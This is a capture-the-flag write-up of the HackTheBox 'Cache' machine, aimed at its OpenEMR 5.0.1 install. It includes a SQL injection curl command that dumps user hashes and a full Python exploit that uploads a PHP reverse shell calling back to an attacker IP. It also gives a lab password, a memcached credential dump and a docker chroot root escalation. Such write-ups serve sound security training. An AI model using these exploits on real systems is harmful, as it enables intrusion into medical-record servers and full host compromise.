HackTheBox Cache detail walkthrought

---
layout: post
title: HackTheBox Cache walkthrough
gh-repo: c00rni/c00rni.github.io
gh-badge: [star, fork, follow]
tags: [enumeration, hackthebox, docker, memecache, bcrypt, su, johntheripper]
comments: true
---

Cache is a machine on HackTheBox platoform with the IP address 10.10.10.188. This machine is rated as medium by the community. As long each enueration phase was done conscientiously, this machine is fun and easy. Cache is vulnerable to multiple CVE; The first one being a sql injection wich allow me to get credential and execute a remote code execution exploit. The first normal user credential can be found in Javascript files. Credential of a second user can be found in memecache service memor and I used docker to elevate my privelege to root.	


![card_info.png](../../_resources/cfb7b7394bdd494aa4d8bcfa47f7b556.png)

# Enumeation

## Port scans

![fast_scan.png](../../_resources/bb22b11f2a494cfab69386290e57ec53.png)


![detail_scan.png](../../_resources/316695b74f154f8faa8793232d5647e3.png)

### Information Gathering

![author_page.png](../../_resources/8ae0d3e9aa8a4701bb3942252aade0fa.png)

The login form html code do not indicate any URL to process the data. That can only mean two things. First, the login page might just be a decoy or client script is excute to handle the login process. I searched for javascript files and found ash login credentials.

![login_creds.png](../../_resources/ceaca8faecc849c598ebf2efbbf4efe8.png)

The author wrote:

*ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author & Creator of Cache. Check out his other projects like Cache: HMS(Hospital Management System)* 

I knew Ash used the domain name `cache.htb` for his website and might have some other project host under the same top-level domain (htb).

Add the domain names `hms.htb` to the system hosts file (`/etc/hosts`) to access HMS(Hospital Management System) project.



![hosts_config_file.png](../../_resources/164b398a0e5240babe0bfaee1e2dd60b.png)


OpenEMR is free and open-source software which is use to medical practice management. I browser to the admin page to get the version number and searched for known vulnerabilities.


![openemr_admin_page.png](../../_resources/6576e1fef6dc4810aee5c00088efaa83.png)

# Foothold

With a quick search on Google, I found that OpenEMR version 5.0.1 were vulnerable to multiple sql injections, authentication Bypass and an authenticated remote code execution.

The code behind the authentification mechanism verify if the user has some session variables set before the resource can be served. The issue is theses variables are set upon visiting.



![login_page_openemr.png](../../_resources/67f463cda57a4294a4662fd9bfb26dcf.png)


 I clicked on the register button and modified the URL to access `http://hms.htb/portal/add_edit_event_user.php`.
 

![add_edit_event_user_page.png](../../_resources/8be49b02060d4cb481bece57a4a17645.png)


The `add_edit_event_user_page` is vulnerable to sql injection. Change the cookie header and execute the commmand below to get the credential of an OpenEMR user.

```bash
curl -i -s -k -X $'GET'     -H $'Cache-Control: no-cache' -H $'Cookie: PHPSESSID=n30rpgmfkjg559hcov0iiurc92' -H $'User-Agent: sqlmap/1.4.8#stable (http://sqlmap.org)' -H $'Host: hms.htb' -H $'Accept: */*' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close'     -b $'PHPSESSID=n30rpgmfkjg559hcov0iiurc92'     $'http://hms.htb/portal/add_edit_event_user.php?eid=-2059%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x4141414141%2CIFNULL%28CAST%28password%20AS%20NCHAR%29%2C0x20%29%2C0x4141414141%2CIFNULL%28CAST%28username%20AS%20NCHAR%29%2C0x20%29%2C0x4141414141%29%2CNULL%20FROM%20openemr.users_secure--%20-' | tail -n2 | gunzip | awk -F "AAAAA" '{print "
password: "$2;print "username: "$3}'
```

The password found were hashed and stated with the characters `$2a$05` which indicate the password has been hashed with a Bcrypt algorithm.


![openemr_admin_passwd.png](../../_resources/61449bead36c42acbd37e77d1ceae0f1.png)


Now that I had valid OpenEMR user credentials I were able to make slight modification on the authenticated [remote code execution exploit](https://www.exploit-db.com/exploits/48515) I found earlier.

Modified code:
```python
# Title: OpenEMR 5.0.1 - Remote Code Execution
# Exploit Author: Musyoka Ian
# Date: 2020-05-25
# Title: OpenEMR < 5.0.1 - Remote Code Execution
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/v5_0_1_3.tar.gz
# Dockerfile: https://github.com/haccer/exploits/blob/master/OpenEMR-RCE/Dockerfile 
# Version: < 5.0.1 (Patch 4)
# Tested on: Ubuntu LAMP, OpenEMR Version 5.0.1.3
# References: https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69

# openemr_exploit.py

#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import requests
import time

auth = "[+] Authentication with credentials provided please be patient"
upload = "[+] Uploading a payload it will take a minute"
netcat = "[+] You should be getting a shell"
s = requests.Session()
payload = {'site': 'default', 'mode' : 'save', 'docid' : 'shell.php', 'content' : """<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = 'X.X.X.X';  # Change this your IP
$port = 9001;       # Change this
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> """}
print (auth)
url = "http://hms.htb/interface/main/main_screen.php?auth=login&site=default" # Modified the URL to the vulnerable page
data= {
    'new_login_session_management' : '1',
    'authProvider' : 'Default',
    'authUser' : 'openemr_admin', # changed this to the username I found in the database
    'clearPass' : 'xxxxxx',       # changed this to the appropriate password 
    'languageChoice' : '1',
    }
    
response = s.post(url, data=data,).text
time.sleep(2)
print (upload)
time.sleep(2)
resp = s.post("http://hms.htb/portal/import_template.php?site=default", data = payload)
time.sleep(2)
print (netcat)
rev_shell = s.get("http://hms.htb/portal/shell.php")
print (rev_shell.text)
```

I open a port with netcat with the appropriate port number, execute the python exploit and got a shell.

![foothold_shell.png](../../_resources/ee4b1dd21db54d5ea3d5c7dd87584047.png)

# Privilege escalation

## Ash user

Once I got a shell, I gather information to elevate my privilege. I read the `/etc/passwd` file and found the user `luffy`. I then had a new user and a lot for credentials so I test each of them with `ssh` and `su` commands. At last I logged myself in as `ash` with the command `su -l ash` and `H@v3_fun` password.



![ash_shell.png](../../_resources/eef08fbf5ea84954828d6c391a65672c.png)

## Luffy user

Memecache service was listening on the loopback interface (127.0.0.1:11211). Memcached is a general-purpose distributed memory caching system. This cache can expose juicy information without authentification.

From ash shell I connected myself to memcache using Telnet (`telnet 127.0.0.1 11211`) and retrieve luffy credentials.


![luffy_creds.png](../../_resources/d3a9dedcf1334981bf4f688f3216433c.png)

I used ssh to get luffy shell.

![luffy_shell.png](../../_resources/9c6eba55c7fe4a0a83d21b5d8e704b4e.png)

## Root user

Docker is a set of platform as a service (PaaS) products that use OS-level virtualization to deliver software in packages called containers.

Docker runs with the SUID bit set. This allow any user who can run the program to execute actions with the highest privileges on the machine. Therefore it's a vulnerability to add any normal user to docker's group.

Since luffy is a group member of docker and an ubuntu container image is on the machine. I ran the command below to elevate my privilege to root user.

```bash
docker run -it -v /:/mnt ubuntu chroot /mnt sh
```


Thanks for reading !

# References
- [Public OpenEMR pentest report](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf)
- [OpenEMR version 5.0.1 authenticated RCE](https://www.exploit-db.com/exploits/48515)
- [How to dump memcache](https://www.hackingarticles.in/penetration-testing-on-memcached-server/)
- [Memcache enumeration](https://book.hacktricks.xyz/pentesting/11211-memcache)
- [Docker wikipedia page](https://en.wikipedia.org/wiki/Docker_(software))